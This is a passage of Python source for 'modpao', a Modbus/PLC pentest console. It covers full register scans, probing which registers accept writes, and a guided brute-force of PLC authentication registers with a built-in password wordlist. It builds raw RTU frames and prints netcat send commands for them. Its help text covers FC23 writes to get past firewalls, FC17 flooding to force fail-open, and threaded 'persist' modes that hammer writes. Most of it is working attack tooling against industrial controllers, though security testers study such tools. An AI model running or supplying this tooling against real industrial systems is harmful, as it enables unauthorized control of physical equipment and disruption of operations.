                    for i in range(min(n, len(block))):
                        v = block[i]
                        if v not in (0, False, None):
                            hits.append((a + i, v))
                a += n
    except Exception as ex:
        vprint(f"sweep {typ} {s}-{e}: {ex}")
    return hits


def _full_scan(ot, start, end, flags):
    dmode = flags.get("d")
    threads = int(flags.get("t", 1))
    deep = bool(flags.get("deep"))
    ip, port, uid = ot.ip, ot.port, ot.uid
    fmap = {"c": ot.read_c, "di": ot.read_di, "h": ot.read_h, "ir": ot.read_ir}
    info(f"=== FULL scan {start}-{end}: Coil / DiscreteInput / HoldingRegister / InputRegister ===")
    info(f"    {'threads=' + str(threads) if threads > 1 else 'sequential + early-stop'}"
         f"{' (deep: no early-stop)' if deep else ''}, non-zero only, Ctrl-C to stop")
    counts = {}

    def show(typ, addr, v):
        name = TYPE_NAME[typ]
        if typ in ("h", "ir"):
            asc = decode([v], "ascii")
            extra = f" [{dmode}:{decode([v], dmode)}]" if dmode else ""
            print(f"    {name:14}{addr:>6}  {C.DIM}{tag_for(addr, typ):11}{C.RS}"
                  f"{C.GR}{v}{C.RS}  {C.DIM}0x{v:04X} {asc}{extra}{C.RS}")
        else:
            print(f"    {name:14}{addr:>6}  {C.DIM}{tag_for(addr, typ):11}{C.RS}{C.GR}{v}{C.RS}")

    try:
        for typ in ("c", "di", "h", "ir"):
            name = TYPE_NAME[typ]; fn = fmap[typ]
            chunk = 1968 if typ in ("c", "di") else 125
            print(f"  {C.CY}-- {name} {start}-{end} --{C.RS}")
            cnt = 0
            if threads > 1:
                span = end - start + 1
                per = max(chunk, -(-span // threads))
                per = -(-per // chunk) * chunk        # round up to chunk multiple
                slices = [(s, min(s + per - 1, end)) for s in range(start, end + 1, per)]
                allhits = []
                with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as ex:
                    futs = [ex.submit(_sweep_slice, ip, port, uid, typ, s, e, chunk, deep)
                            for s, e in slices]
                    for f in concurrent.futures.as_completed(futs):
                        allhits += f.result()
                for addr, v in sorted(allhits):
                    show(typ, addr, v); cnt += 1
            else:
                a = start; consec = 0
                while a <= end:
                    n = min(chunk, end - a + 1)
                    block = fn(a, n)
                    if block is None:
                        consec += 1
                        if not deep and consec >= 5:
                            vprint(f"{name}: end of range near {a} (early-stop)")
                            break
                    else:
                        consec = 0
                        for i in range(min(n, len(block))):
                            v = block[i]
                            if v in (0, False, None):
                                continue
                            show(typ, a + i, v); cnt += 1
                    a += n
            counts[name] = cnt
            ok(f"{name}: {cnt} non-zero")
    except KeyboardInterrupt:
        info("full scan stopped by user")
    total = sum(counts.values())
    ok(f"FULL scan done: {total} non-zero total  {counts}")
    if total:
        record_finding("recon", f"full {start}-{end}: {counts}")


def m_auto(flags, args):
    uid = uid_from(flags); mode = args[0] if args else "recon"
    with OT(sess()["ip"], sess()["port"], uid) as ot:
        if mode == "recon":
            if len(args) > 1 and args[1] == "full":
                extra = [t for t in args[2:]]
                if extra:
                    rr = parse_addrs(extra[0]); s0, e0 = rr[0], rr[-1]
                else:
                    s0, e0 = 0, 65535
                _full_scan(ot, s0, e0, flags); return
            rng = parse_addrs(args[1]) if len(args) > 1 else list(range(0, 64))
            dmode = flags.get("d")
            info("=== AUTO recon ===")
            print("  device:", ot.device_info() or "n/a")
            for label, typ in (("coils", "c"), ("hreg", "h"), ("ireg", "ir")):
                snap = _collect(ot, typ, list(range(0, 8)), multi=True)
                print(f"  {label}[0..7] = {[snap[a] for a in sorted(snap)]}")
            info(f"scanning hreg {rng[0]}..{rng[-1]} via block-read (non-zero, int/hex/ascii):")
            values = _collect(ot, "h", rng, multi=True)
            found = 0
            for a in sorted(values):
                v = values[a]
                if not v:
                    continue
                asc = decode([v], "ascii")
                extra = f"  [{dmode}:{decode([v], dmode)}]" if dmode else ""
                print(f"    {a:>5} {C.DIM}{tag_for(a, 'h'):11}{C.RS}{C.GR}{v}{C.RS}"
                      f"  {C.DIM}0x{v:04X} {asc}{extra}{C.RS}")
                found += 1
            ok(f"{found} non-zero in {rng[0]}..{rng[-1]}")
        elif mode == "writable":
            # writable [c|h] RANGE   (default h). tests write + restores.
            rest = list(args[1:])
            typ = "h"
            if rest and rest[0] in ("c", "di", "h", "ir"):
                typ = rest[0]; rest = rest[1:]
            if typ in ("di", "ir"):
                err(f"{TYPE_NAME[typ]} is read-only - nothing to probe"); return
            rng = parse_addrs(rest[0]) if rest else list(range(0, 64))
            if flags.get("a") and sess()["auth_map"]:
                _apply_auth(ot)
            info(f"probing writable {TYPE_NAME[typ]} {rng[0]}..{rng[-1]} (writes test value, restores)")
            hits = []; driven = []
            for a in rng:
                if typ == "c":
                    orig = ot.read_c(a, 1)
                    if orig is None: continue
                    o = 1 if orig[0] else 0; tv = 1 - o
                    ot.write_c(a, tv); after = ot.read_c(a, 1)
                    if after and int(after[0]) == tv:
                        hits.append(a); ot.write_c(a, o); ok(f"writable: c {a} {tag_for(a, 'c')}")
                    elif after is not None:
                        driven.append(a)
                else:
                    orig = ot.read_h(a, 1)
                    if orig is None: continue
                    tv = 31337 if orig[0] != 31337 else 111
                    ot.write_hs(a, [tv]); after = ot.read_h(a, 1)
                    if after and after[0] == tv:
                        hits.append(a); ot.write_hs(a, [orig[0]]); ok(f"writable: h {a} {tag_for(a, 'h')}")
                    elif after is not None:
                        driven.append(a)
            ok(f"WRITABLE {typ}: {hits}")
            if driven:
                info(f"NOT writable ({typ}, driven-by-PLC / locked / read-only): {driven}")
                info("  -> holding regs here may need  writable h RANGE -a  (auth first)")
            if hits: record_finding("writable", f"{typ} {hits}")
        elif mode == "slave":
            info("slave/unit enum 0-32:")
            for u in range(0, 33):
                ot.uid = u; v = ot.read_h(0, 1)
                if v is not None: ok(f"unit {u} -> hreg[0]={v[0]}")
        else:
            err("AUTO: recon | writable RANGE | slave")


def calc_crc(data):
    crc = 0xFFFF
    for byte in data:
        crc ^= byte
        for _ in range(8):
            crc = (crc >> 1) ^ 0xA001 if crc & 1 else crc >> 1
    return struct.pack("<H", crc)


def _rtu_read_frame(slave, fc, addr, count=1, no_crc=False):
    pdu = bytes([slave, fc]) + struct.pack(">HH", addr, count)
    return pdu if no_crc else pdu + calc_crc(pdu)


def _rtu_write_frame(slave, typ, addr, val, no_crc=False):
    if typ == "c":
        pdu = bytes([slave, 0x05]) + struct.pack(">HH", addr, 0xFF00 if val else 0x0000)
    else:
        pdu = bytes([slave, 0x06]) + struct.pack(">HH", addr, val & 0xFFFF)
    return pdu if no_crc else pdu + calc_crc(pdu)


def _show_frame(frame, desc, slave, no_crc):
    h = frame.hex().upper()
    spaced = " ".join(h[i:i + 2] for i in range(0, len(h), 2))
    ok(f"{desc}  slave={slave}{' [no CRC]' if no_crc else ''}")
    print(f"  hex : {C.GR}{spaced}{C.RS}")
    print(f"  send: {C.DIM}echo {h} | xxd -r -p | nc {sess()['ip'] or 'HOST'} {sess()['port']}{C.RS}")


def m_rtu(flags, args):
    if len(args) < 3 or args[0] != "build":
        info("RTU frame builder (offline - no connection needed):")
        info("  build read TYPE ADDR [COUNT]     read frame  (FC01 coil / FC03 hreg)")
        info("  build write TYPE ADDR VAL        write frame (FC05 coil / FC06 hreg)")
        info("  TYPE: c=coil h=holding   flags: -s SLAVE (default uid)  --no-crc")
        info("  send with:  echo <HEX> | xxd -r -p | nc <host> <port>")
        return
    action, typ = args[1], args[2]
    if typ not in ("c", "h"):
        err("TYPE must be c (coil) or h (holding register)"); return
    slave = int(flags.get("s", sess()["uid"]))
    no_crc = bool(flags.get("no-crc"))
    if action == "read":
        addr = int(args[3]); count = int(args[4]) if len(args) > 4 else 1
        fc = 0x01 if typ == "c" else 0x03
        frame = _rtu_read_frame(slave, fc, addr, count, no_crc)
        _show_frame(frame, f"FC{fc:02X} read {'coil' if typ == 'c' else 'hreg'} addr={addr} x{count}", slave, no_crc)
    elif action == "write":
        if len(args) < 5:
            err("need a value: build write TYPE ADDR VAL"); return
        addr = int(args[3]); val = int(args[4])
        frame = _rtu_write_frame(slave, typ, addr, val, no_crc)
        desc = (f"FC05 write coil addr={addr} {'ON' if val else 'OFF'}" if typ == "c"
                else f"FC06 write hreg addr={addr} value={val}")
        _show_frame(frame, desc, slave, no_crc)
    else:
        err("action must be 'read' or 'write'")


# ------------------------------------------------------------ AUTH BRUTE ----
BUILTIN_WORDLIST = ["OmniPLC123#", "Automate_X_PLC!@#", "admin", "password",
                    "simplepassword123$%^", "guest"]


def encode_pw(pw, mode):
    b = pw.encode("latin-1", "ignore")
    if mode == "2byte":
        if len(b) % 2: b += b"\x00"
        return list(struct.unpack(f">{len(b)//2}H", b))
    if mode == "ascii+1": return [c for c in b] + [0x52]
    if mode == "reversed": return [c for c in b[::-1]]
    if mode == "xor": return [c ^ 0xFF for c in b]
    return [c for c in b]  # ascii


def m_brute(flags):
    info("=== AUTH BRUTE (guided) ===")
    rng = input("  b.1 target addr range [3890-4096]> ").strip() or "3890-4096"
    wl = input("  b.2 wordlist (built-in | path)> ").strip() or "built-in"
    enc = input("  b.3 encoding [ascii|2byte|ascii+1|reversed|xor|auto]> ").strip() or "auto"
    amode = input("  b.4 addr mode [seq|scan]> ").strip() or "seq"
    test_addr = int(input("  b.5 test address [1027]> ").strip() or "1027")
    fc = input("  b.6 FC [fc16|fc23|both]> ").strip() or "fc16"

    addrs = parse_addrs(rng)
    words = BUILTIN_WORDLIST if wl == "built-in" else _load_wordlist(wl)
    encs = ["ascii", "2byte", "ascii+1", "reversed", "xor"] if enc == "auto" else [enc]
    uid = uid_from(flags)
    info(f"brute: {len(words)}w x {len(encs)}enc x {len(addrs)}addr, test@{test_addr} fc={fc}")
    with OT(sess()["ip"], sess()["port"], uid) as ot:
        targets = addrs if amode == "scan" else [addrs[0]]
        for auth_addr in targets:
            for pw in words:
                for e in encs:
                    regs = encode_pw(pw, e)
                    if _try_auth(ot, auth_addr, regs, test_addr, fc):
                        vuln(f"PASSWORD FOUND: '{pw}' enc={e} auth@{auth_addr}")
                        sess()["auth_map"] = {str(auth_addr): regs}
                        record_finding("auth", f"pw='{pw}' enc={e} @{auth_addr}")
                        autosave(); ok("saved to session.auth_map")
                        return
    err("no password found")


def _try_auth(ot, auth_addr, regs, test_addr, fc):
    if fc in ("fc23", "both"): ot.fc23(auth_addr, regs, raddr=auth_addr, rcount=len(regs))
    if fc in ("fc16", "both"): ot.write_hs(auth_addr, regs)
    before = ot.read_h(test_addr, 1)
    if before is None: return False
    tv = 777 if before[0] != 777 else 778
    ot.fc23(test_addr, [tv]) if fc in ("fc23", "both") else ot.write_h(test_addr, tv)
    after = ot.read_h(test_addr, 1)
    return bool(after and after[0] == tv)


def _load_wordlist(path):
    try:
        with open(path) as f:
            return [l.strip() for l in f if l.strip()]
    except OSError as e:
        err(f"wordlist: {e}"); return BUILTIN_WORDLIST


# ---------------------------------------------------------- S / 8 sessions ---
def m_auth(flags, args):
    """Configure the per-session unlock recipe (auth_map) the easy way."""
    s = sess()
    if not args:
        info("=== authentication (this session) ===")
        print(f"  write FC when replaying: {C.OR}{s.get('auth_fc', 'fc16')}{C.RS}  (change: auth fc fc06|fc16|fc23)")
        if s["auth_map"]:
            keys = sorted(int(k) for k in s["auth_map"])
            if len(keys) > 3:
                print(f"  auth_map: same password on {len(keys)} regs {keys[0]}-{keys[-1]} (seq)")
            else:
                for reg, vals in s["auth_map"].items():
                    print(f"    reg {reg}  <-  {vals}")
        else:
            print("  (none set yet for this session)")
        print()
        print("  set it the easy way (from a password):")
        print("    auth setpw 3890 OmniPLC123#4          pack password -> reg 3890")
        print("    auth setpw 3890-4096 OmniPLC123#4     seq: write to EVERY reg in range")
        print("    auth setpw 3890 OmniPLC123# 2byte     choose encoding")
        print("       enc = ascii(default) | 2byte | ascii+1 | reversed | xor")
        print("    auth fc fc23                          replay the unlock via FC23 (or fc06/fc16)")
        print("  or raw register values:")
        print("    auth set 3890 79,109,110,105          write these ints to reg 3890")
        print("    auth setmap 3964:56,3919:90,...        SCATTERED reg:val pairs (randomized auth)")
        print("  check / manage:")
        print("    auth test 1027       replay auth, see if a write to 1027 unlocks")
        print("    auth clear           remove auth for this session")
        print()
        print("  then just add  -a  to your write, e.g.:   h 1027 100 -a")
        return
    cmd = args[0].lower()
    if cmd in ("fc06", "fc16", "fc23", "single", "multi"):
        args = ["fc", cmd]; cmd = "fc"        # allow  auth fc23  (short form)
    if cmd == "setpw" and len(args) >= 3:
        addrspec, pw = args[1], args[2]
        enc = args[3] if len(args) > 3 else "ascii"
        try:
            addrs = parse_addrs(addrspec)
        except ValueError:
            err("first value must be the register ADDRESS (a number), not the password")
            info("correct order:   auth setpw 3890 OmniPLC123#4")
            info("                 (3890 = auth register,  OmniPLC123#4 = password)")
            return
        regs = encode_pw(pw, enc)
        s["auth_map"] = {str(a): regs for a in addrs}
        autosave()
        if len(addrs) == 1:
            ok(f"auth set: reg {addrs[0]} <- {pw!r} ({enc}) = {regs}")
        else:
            ok(f"auth set (seq): {pw!r} ({enc}) -> every reg {addrs[0]}-{addrs[-1]} "
               f"({len(addrs)} addrs) for randomized/seq auth address")
    elif cmd == "set" and len(args) >= 3:
        addr = args[1]
        try:
            vals = [int(x) for x in args[2].split(",")]
        except ValueError:
            err("values must be ints, e.g. 79,109,110"); return
        s["auth_map"][str(addr)] = vals
        autosave(); ok(f"auth set: reg {addr} <- {vals}")
    elif cmd == "setmap" and len(args) >= 2:
        pairs = {}
        for tok in " ".join(args[1:]).replace(" ", ",").split(","):
            tok = tok.strip()
            if not tok:
                continue
            if ":" not in tok:
                err(f"use reg:val pairs e.g. 3964:56,3919:90  (bad: {tok})"); return
            r, v = tok.split(":", 1)
            try:
                pairs[str(int(r))] = [int(v)]
            except ValueError:
                err(f"reg:val must be numbers (bad: {tok})"); return
        s["auth_map"] = pairs
        s["auth_fc"] = "fc06"     # scattered auth uses single-register writes
        autosave()
        ok(f"auth map set: {len(pairs)} scattered reg:val pairs (FC06). randomized-address auth ready.")
    elif cmd == "fc" and len(args) >= 2:
        m = {"single": "fc06", "multi": "fc16", "fc06": "fc06", "fc16": "fc16", "fc23": "fc23"}
        v = m.get(args[1].lower())
        if not v:
            err("auth fc  ->  fc06 (single) | fc16 (multi) | fc23"); return
        s["auth_fc"] = v; autosave(); ok(f"auth write FC = {v}")
    elif cmd == "clear":
        s["auth_map"] = {}; autosave(); ok("auth cleared for this session")
    elif cmd == "test":
        if not s["auth_map"]:
            warn("no auth set - use 'auth setpw ...' first"); return
        test_addr = int(args[1]) if len(args) > 1 else 1027
        uid = uid_from(flags)
        with OT(s["ip"], s["port"], uid) as ot:
            _apply_auth(ot)
            before = ot.read_h(test_addr, 1)
            if before is None:
                err(f"cannot read test reg {test_addr}"); return
            tv = 777 if before[0] != 777 else 778
            # try the oracle write via FC23 first (bypass path), then FC16/FC06
            methods = [("FC23", lambda: ot.fc23(test_addr, [tv])[0]),
                       ("FC16", lambda: ot.write_hs(test_addr, [tv])),
                       ("FC06", lambda: ot.write_h(test_addr, tv))]
            hit_fc = None
            for fcname, wfn in methods:
                wfn()
                chk = ot.read_h(test_addr, 1)
                if chk and chk[0] == tv:
                    hit_fc = fcname; break
            if hit_fc:
                vuln(f"auth WORKS - write to {test_addr} stuck (via {hit_fc}) after unlock")
                ot.fc23(test_addr, [before[0]])  # restore
                record_finding("auth", f"unlock verified, write FC={hit_fc}, regs {list(s['auth_map'])}")
                info(f"-> use  {hit_fc.lower() if hit_fc=='FC23' else ''}  when you write: h {test_addr} <val> -a"
                     + (" --fc23" if hit_fc == "FC23" else ""))
            else:
                warn(f"auth did NOT unlock {test_addr} - check password / register / encoding / --fc23")
    else:
        err("auth: (no args)=show | setpw ADDR PW [enc] | set ADDR V1,V2 | clear | test [ADDR]")


def m_tag(flags, args):
    tags = sess().setdefault("tags", [])
    if not args:
        info("TAG manager - label a type+address so scans show a name")
        print("    add TYPE ADDR NAME     e.g.  add c 1 master")
        print("    del ID                 remove a tag by its id")
        print("    list                   show all tags")
        print("    TYPE: c | di | h | ir")
        return
    sub = args[0].lstrip("-").lower()
    if sub == "add" and len(args) >= 4:
        typ = args[1]
        if typ not in TYPE_NAME:
            err("TYPE must be c | di | h | ir"); return
        try:
            addr = int(args[2])
        except ValueError:
            err("ADDR must be a number"); return
        name = " ".join(args[3:])
        tags.append({"type": typ, "addr": addr, "name": name})
        autosave(); ok(f"tag [{len(tags)}] {TYPE_NAME[typ]} {addr} = {name}")
    elif sub == "del" and len(args) >= 2:
        try:
            i = int(args[1])
        except ValueError:
            err("del ID (a number from 'list')"); return
        if 1 <= i <= len(tags):
            t = tags.pop(i - 1); autosave()
            ok(f"deleted [{i}] {t['type']} {t['addr']} = {t['name']}")
        else:
            err(f"no tag id {i} (use 'list')")
    elif sub == "list":
        if not tags:
            info("no tags yet - add one:  add c 1 master")
        else:
            info(f"=== tags ({len(tags)}) ===")
            for i, t in enumerate(tags, 1):
                print(f"  [{i}] {TYPE_NAME.get(t['type'], t['type']):16}{t['addr']:>6}  {t['name']}")
    else:
        err("tag: add TYPE ADDR NAME | del ID | list")


def m_S():
    s = sess()
    lock = "[A]" if s["auth_map"] else "[-]"
    info(f"=== current session [{STATE['current']}] {s['name']} {lock} ===")
    print(f"  ip      = {s['ip'] or '-':16} (set ip [ip])")
    print(f"  port    = {s['port']:<16} (set port [port])")
    print(f"  uid     = {s['uid']:<16} (set uid [n])")
    print(f"  slave   = {str(s['slave']):16} (set slave [1,5 | all | none])")
    print(f"  decode  = {s['decode']:16} (set decode [f32|ascii|hex|int|time])")
    astate = f"{len(s['auth_map'])} reg set" if s['auth_map'] else "not set"
    print(f"  auth    = {astate:16} (auth setpw 3890 <password>)")
    print(f"  findings= {len(s['findings'])}")
    print(f"  {C.DIM}switch session: 8  ->  use [N|name]{C.RS}")


def m_sessions(args):
    if not args:
        info("=== sessions ===")
        for i, s in enumerate(STATE["sessions"]):
            star = "*" if i == STATE["current"] else " "
            lock = "[A]" if s["auth_map"] else "  "
            print(f" {star}[{i}] {s['name']:12} {s['ip'] or '-'}:{s['port']} "
                  f"uid={s['uid']} {lock} findings={len(s['findings'])}")
        print(f"  {C.DIM}use [N|name] | 8 new [name] | 8 save | 8 del N | 8 export [N]{C.RS}")
        return
    cmd = args[0]
    if cmd == "new":
        name = args[1] if len(args) > 1 else f"session{len(STATE['sessions'])}"
        base = dict(sess()); base.update(name=name, auth_map={}, findings=[])
        STATE["sessions"].append(base); STATE["current"] = len(STATE["sessions"]) - 1
        autosave(); ok(f"created + switched to [{STATE['current']}] {name}")
    elif cmd == "save":
        autosave(); ok("saved")
    elif cmd == "del" and len(args) > 1:
        i = int(args[1])
        if len(STATE["sessions"]) == 1:
            err("cannot delete the only session"); return
        if 0 <= i < len(STATE["sessions"]):
            nm = STATE["sessions"].pop(i)["name"]
            STATE["current"] = min(STATE["current"], len(STATE["sessions"]) - 1)
            autosave(); ok(f"deleted {nm}")
    elif cmd == "export":
        i = int(args[1]) if len(args) > 1 else STATE["current"]
        _export_session(i)
    else:
        err("8: use N | new | save | del N | export N")


def m_use(args):
    if not args:
        err("use [N|name]"); return
    key = args[0]
    idx = None
    if key.isdigit() and int(key) < len(STATE["sessions"]):
        idx = int(key)
    else:
        for i, s in enumerate(STATE["sessions"]):
            if s["name"] == key:
                idx = i; break
    if idx is None:
        err(f"no session '{key}'"); return
    STATE["current"] = idx; autosave()
    ok(f"switched to [{idx}] {sess()['name']}")


def _export_session(i):
    if not (0 <= i < len(STATE["sessions"])):
        err("bad index"); return
    s = STATE["sessions"][i]
    fn = f"modpao_export_{s['name']}.md"
    lines = [f"# modpao session export: {s['name']}", "",
             f"- target: {s['ip']}:{s['port']}  uid={s['uid']}",
             f"- auth_map: {json.dumps(s['auth_map'])}", "", "## Findings", ""]
    if s["findings"]:
        lines += ["| time | kind | detail |", "|------|------|--------|"]
        lines += [f"| {f['ts']} | {f['kind']} | {f['detail']} |" for f in s["findings"]]
    else:
        lines.append("_none_")
    with open(fn, "w") as f:
        f.write("\n".join(lines) + "\n")
    ok(f"exported -> {fn}")


# ------------------------------------------------------------------- help ----
HELP = f"""
{C.OR}{C.BD}modpao{C.RS} - modbus pentest console
  {C.OR}S{C.RS}      current session + how to set (set ip/port/uid/slave/decode)
  {C.OR}8{C.RS}      all sessions - list, then  use [N|name]  to switch
  {C.OR}0{C.RS}      info      FC43 device id
  {C.OR}1{C.RS}      enum      read/scan/flood c|di|h|ir
  {C.OR}2{C.RS}      monitor   poll every N s
  {C.OR}3{C.RS}      watch     delta + threshold alert
  {C.OR}4{C.RS}      write     coil/hreg (confirm)
  {C.OR}5{C.RS}      persist   fc23 / flood / all
  {C.OR}6{C.RS}      rtu       build RTU hex frames (offline)
  {C.OR}7{C.RS}      auto      recon / writable / slave
  {C.OR}9{C.RS}      discover  find Modbus hosts (scan IP range)
  {C.OR}00{C.RS}     tag       name your own registers/coils
  {C.OR}brute{C.RS}  guided auth crack -> auth_map
  {C.OR}misc{C.RS}   full flag guide + how to authenticate
  {C.OR}help{C.RS}   this menu
  {C.OR}exit{C.RS}   save + quit

{C.OR2}tip:{C.RS} type a number (e.g. {C.OR}1{C.RS}) to ENTER that mode, then {C.OR}help{C.RS} for detailed
     guidance and {C.OR}b{C.RS} to go back to this menu.
{C.DIM}flags: -a auth  -d f32|ascii|hex|int|time  -u uid  -t threads  -D sec  -y (skip confirm)
       -F hide-zeros  --multi block-read/write  -v verbose   |   cmd: verbose on|off
addr: 1-20,100,150-160,200    resume: auto-load last session on start
per-session: auth_map, findings log, audit trail (modpao_<name>.audit.log)
type {C.OR}misc{C.RS} for a full guide to flags + how to authenticate.{C.RS}
"""

GUIDE = f"""
{C.OR}{C.BD}============  modpao quick-start guide  ============{C.RS}

  modpao talks to Modbus / PLC devices.
  You work in 2 layers:  the MAIN menu (choose what to do)
  and a MODE (actually do it). Enter a mode by typing its number.


  {C.OR}STEP 1  -  point at a target{C.RS}
  ----------------------------
    set ip 172.19.5.3        set the device IP
    set port 502             (default is 502)

    ...or hunt for devices on the network:
    9                        enter discover mode
    172.19.5.0/24            scan the whole subnet
    b                        back to main menu


  {C.OR}STEP 2  -  enter a mode (type the number){C.RS}
  -----------------------------------------
    1  enum      read / scan data
    2  monitor   watch values live (table)
    4  write     change a value
    7  auto      one-click recon
    b            leave the mode


  {C.OR}STEP 3  -  read something{C.RS}
  --------------------------
    1                    enter enum mode
    read h 1027          read one holding register
    read c 1-16          read 16 coils
    scan h 0-4096        find every non-zero register
    b                    back


  {C.OR}STEP 4  -  change a value (write){C.RS}
  --------------------------------
    4                    enter write mode
    h 1027 100           set register 1027 = 100
                         (it asks y / N first)


  {C.OR}STEP 5  -  locked device? authenticate{C.RS}
  -------------------------------------
    brute                crack the password (guided)
                         -> saves the unlock into this session
    4                    write mode
    h 1027 100 -a        replay auth, THEN write

    already know the password? skip brute:
    auth setpw 3890 OmniPLC123#4    then  h 1027 100 -a


  {C.OR}HANDY{C.RS}
  -----
    help     help for wherever you are right now
    misc     every flag + how auth works, explained
    S        show current target + settings
    8        switch between saved targets
    |        chain commands:   read c 1-8 | scan h 1-50
    exit     save + quit  (it resumes next time)

{C.DIM}  tip: type  help  inside any mode for its detailed usage.{C.RS}
"""

MISC = f"""
{C.OR}{C.BD}GLOBAL FLAGS (work in any mode){C.RS}
  -u N        unit / slave id (default 1)
  -d MODE     decode holding regs:  f32  ascii  hex  int  time
  -F          hide values that are 0 / False (read mode)
  --multi     block read/write - one Modbus request for a whole range (fast)
  -t N        use N threads (own connection each) for big ranges
  --fc23      write via FC23 - bypasses a firewall that blocks FC6/16 (write mode)
  -T          monitor: rows = addresses (refresh in place)
  -v          verbose - print the REAL error when something fails
  -y          skip the yes/no confirm on writes

{C.OR}{C.BD}HOW TO AUTHENTICATE a locked PLC{C.RS}
  Some PLCs refuse writes until you send a password to an "auth register".
  modpao handles this in 2 steps:
    {C.OR}1){C.RS} type  {C.OR}brute{C.RS}  at the main menu (guided). it tries passwords and,
       when one works, SAVES the unlock recipe into the session (auth_map).
    {C.OR}2){C.RS} then add  {C.OR}-a{C.RS}  to your write/persist. modpao replays auth_map to
       unlock first, THEN does your write. example:
           {C.DIM}4                 (enter write mode)
           h 1027 100 -a     (auth, then write){C.RS}
  check: the prompt shows {C.OR}[A]{C.RS} and  {C.OR}S{C.RS}  shows "auth = N reg" once set.
  already know the password? skip brute and set it directly:
     {C.DIM}auth setpw 3890 OmniPLC123#4{C.RS}    then use  -a  as above.
  type  {C.OR}auth{C.RS}  anytime to view / set / test / clear the unlock.

{C.OR}{C.BD}DATA TYPES{C.RS}   c = Coil    di = DiscreteInput    h = HoldingRegister    ir = InputRegister
{C.OR}{C.BD}ADDRESSES{C.RS}   5   |   1-20   |   1-20,100,200
{C.OR}{C.BD}CHAINING{C.RS}    run several commands on one line with |  ->  read c 1-8 | scan h 1-50
  {C.OR}b{C.RS} = back
"""


# ------------------------------------------------------------------ modes ----
MODE = None
# number / name  ->  mode key
MODES = {"1": "enum", "enum": "enum", "2": "monitor", "monitor": "monitor",
         "3": "watch", "watch": "watch", "4": "write", "write": "write",
         "5": "persist", "persist": "persist", "7": "auto", "auto": "auto",
         "9": "discover", "discover": "discover",
         "6": "rtu", "rtu": "rtu",
         "00": "tag", "tag": "tag"}

MODE_HELP = {
"enum": f"""{C.OR}{C.BD}ENUM{C.RS} - read / scan Modbus data
  {C.BD}data types (TYPE):{C.RS}
    c  = coil             on/off output   (read + write)
    di = discrete input   on/off input    (read only)
    h  = holding register 16-bit value    (read + write)
    ir = input register   16-bit value    (read only)
  {C.BD}commands:{C.RS}
    read TYPE ADDR        read value(s) at address
    scan h RANGE          sweep holding regs, show non-zero only
    scan ir RANGE         sweep input regs
    scan -u 0-32          find which slave/unit ids answer
    flood TYPE ADDR [SEC] hammer reads at MAX speed (default 10s); reports
                         reads/s, error %, latency min/avg/max, value range seen
  ADDR: 5 | 1-20 | 1-20,100,200
  flags: -d f32|ascii|hex|time  -u N  -F (hide 0/false)  --multi (block read)  -t N (threads)  -v (verbose)
         flood only: SEC or -D sec (0=until Ctrl-C)  --count N (stop after N reads)
  {C.DIM}ex: read h 1027 | read h 2048-2053 -d f32 | read c 1-16 -F | scan h 0-4096
      flood h 1027 | flood h 1027 30 | flood h 1024-1030 -t 8 | flood h 40050 -d f32
      chain with | : read c 1-8 | scan h 1-50{C.RS}
  {C.OR}b{C.RS} = back to main menu""",

"monitor": f"""{C.OR}{C.BD}MONITOR{C.RS} - re-read every N seconds as a live TABLE
  format:  TYPE ADDR INTERVAL
  flags:  -T  rows = addresses (refreshes in place; good for many regs)
          (default) columns = addresses, one row per poll (scrolls)
          block-read is automatic for speed
  {C.DIM}ex: h 16,1027,2048 2      (3 columns, new row every 2s)
      h 1024-1035 1 -T      (vertical, refreshes)
      c 1-8 1{C.RS}
  Ctrl-C = stop     {C.OR}b{C.RS} = back to main menu""",

"watch": f"""{C.OR}{C.BD}WATCH{C.RS} - show only when a value CHANGES (delta) + threshold alert
  format:  TYPE ADDR INTERVAL [thr ADDR OP VAL]     OP = >  <  =
  {C.DIM}ex: h 1027 2            (alert on change)
      h 16 2 thr 16 > 90   (alert when reg16 > 90){C.RS}
  Ctrl-C = stop     {C.OR}b{C.RS} = back to main menu""",

"write": f"""{C.OR}{C.BD}WRITE{C.RS} - write to coil / holding register (asks yes/no first)
  format:  TYPE ADDR VAL        (ADDR can be one 5 or a range 1-10)
    c ADDR 0|1           write coil  (Coil, on/off)
    h ADDR VALUE         write holding register
  how it writes (pick one):
    (default)     single  = FC05/FC06, one request per address
    --multi       block   = FC15/FC16, whole range in ONE request
    --fc23        FC23    = read+write combo, bypasses a firewall blocking FC6/16
    -t N          threads = N parallel connections (big ranges)
  other flags: -a (auth first via auth_map)  -y (skip confirm)  -v (verbose)
  {C.DIM}ex: h 1027 100 | c 5 1 | h 1024-1030 0 --multi | h 1027 100 --fc23 | h 1027 100 -a{C.RS}
  {C.OR}b{C.RS} = back to main menu""",

"persist": f"""{C.OR}{C.BD}PERSIST{C.RS} - force / hold a write (several techniques)
    h ADDR VAL -t N -D sec     hammer with N threads for D sec
    fc23 h ADDR VAL            write via FC23 (bypass FC6/16 block)
    --flood h ADDR VAL -t N    FC17 flood (fail-open) then write
    all ADDR VAL               try FC6/16/23 and report which works
  flags: -t threads  -D seconds  -y (skip confirm)
  {C.DIM}ex: h 1027 200 -t 20 -D 60 | fc23 h 1027 100 | --flood h 1027 100 -t 200 | all 1027 100{C.RS}
  {C.OR}b{C.RS} = back to main menu""",

"auto": f"""{C.OR}{C.BD}AUTO{C.RS} - run a ready-made routine
    recon [RANGE]      device info + quick hreg scan (default 0-63)
    recon full [RANGE] FULL sweep ALL types, chunked + early-stop (fast)
                       flags: -t N (parallel, faster)  --deep (no early-stop)
    writable RANGE     probe which regs are writable (writes test, restores)
    slave              enumerate unit ids 0-32
  {C.DIM}ex: recon | writable 1024-1100 | slave{C.RS}
  {C.OR}b{C.RS} = back to main menu""",

"discover": f"""{C.OR}{C.BD}DISCOVER{C.RS} - find Modbus hosts on the network
  format:  IP-RANGE
    172.19.5.1-254        last-octet range
    172.19.5.0/24         CIDR block
    172.19.5.3            single host
  flags: -p PORT (default 502)  --nmap (deep, needs nmap)  --add (save hits as sessions)
  {C.DIM}ex: 172.19.5.1-254 | 172.19.5.0/24 --add | 172.19.5.0/24 --nmap{C.RS}
  {C.OR}b{C.RS} = back to main menu""",

"rtu": f"""{C.OR}{C.BD}RTU{C.RS} - build Modbus-RTU hex frames offline (for nc / serial gateway)
  build read  TYPE ADDR [COUNT]    read frame  (FC01 coil / FC03 hreg)
  build write TYPE ADDR VAL        write frame (FC05 coil / FC06 hreg)
    TYPE:  c = coil     h = holding register
